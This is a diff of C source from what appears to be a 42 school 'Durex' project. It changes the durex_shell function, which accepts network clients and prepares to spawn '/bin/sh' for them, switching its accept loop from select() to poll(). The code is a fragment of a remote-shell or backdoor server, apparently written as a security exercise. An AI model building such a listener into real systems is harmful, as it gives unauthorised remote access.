@@ -6,7 +6,7 @@
 /*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2022/02/13 13:39:33 by user42            #+#    #+#             */
-/*   Updated: 2022/02/13 15:15:12 by user42           ###   ########.fr       */
+/*   Updated: 2022/02/13 16:21:41 by user42           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -18,14 +18,11 @@ void	durex_shell(t_server *server)
 	reset_server(server);
 
 	t_client			*tmp;
-	struct timeval		timeout;
 	char				*const args[] = {"/bin/sh", 0};
+	int					ready;
 
 	while (1)
 	{
-		timeout.tv_sec = 1;
-		timeout.tv_usec = 0;
-
 		tmp = server->clients;
 		while (tmp)
 		{
@@ -48,14 +45,15 @@ void	durex_shell(t_server *server)
 			break ;
 		}
 
-		server->read_set = server->write_set = server->master_set;
-		if (select(server->max_sd + 1, &(server->read_set), &(server->write_set), 0, &timeout) <= 0)
+		ready = poll(server->pfds, 1, 0);									// Only the server listen_sd to watch for incoming connections.
+		if (ready <= 0)
 			continue ;
-		for (int i = 0; i <= server->max_sd; i++)
+
+		for (int i = 0; i < 1; i++)
 		{
-			if (FD_ISSET(i, &(server->read_set)))
+			if (server->pfds[i].revents & POLLIN)
 			{
-				if (i == server->listen_sd)
+				if (server->pfds[i].fd == server->listen_sd)				// Should always be the case, but who knows
 				{
 					int clientid = add_shell_client(server);
 					if (clientid == -1)
